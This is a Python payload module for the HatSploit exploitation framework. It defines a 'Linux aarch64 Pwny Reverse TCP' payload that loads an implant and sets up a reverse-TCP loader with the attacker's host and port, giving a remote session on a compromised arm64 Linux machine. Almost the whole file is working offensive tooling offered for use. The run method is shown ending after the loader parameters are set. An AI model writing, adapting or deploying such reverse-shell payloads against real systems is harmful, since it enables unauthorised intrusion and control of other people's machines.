"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from pwny import Pwny
from pwny.session import PwnySession

from pex.assembler import Assembler

from hatsploit.lib.payload.basic import *


class HatSploitPayload(Payload, Handler, Pwny, Assembler):
    def __init__(self):
        super().__init__()

        self.details = {
            'Name': "Linux aarch64 Pwny Reverse TCP",
            'Payload': "linux/aarch64/pwny_reverse_tcp",
            'Authors': [
                'Ivan Nikolsky (enty8080) - payload developer'
            ],
            'Description': "Linux aarch64 (arm64) Pwny Reverse TCP",
            'Arch': ARCH_AARCH64,
            'Platform': OS_LINUX,
            'Session': PwnySession,
            'Rank': "high",
            'Type': "reverse_tcp"
        }

    def implant(self):
        implant = self.get_implant(payload=self)

        pawn = self.get_pawn(
            module='linux/aarch64/loader',
            platform=self.details['Platform'],
            arch=self.details['Arch']
        )

        if pawn:
            pawn.set('length', len(implant))
            return self.run_pawn(pawn)

    def run(self):
        implant = self.get_implant(payload=self)

        pawn = self.get_pawn(
            module='linux/aarch64/reverse_tcp_loader',
            platform=self.details['Platform'],
            arch=self.details['Arch'],
            type=self.details['Type']
        )

        if pawn:
            pawn.set('host', self.rhost.value)
            pawn.set('port', self.rport.value)
            pawn.set('length', len(implant))
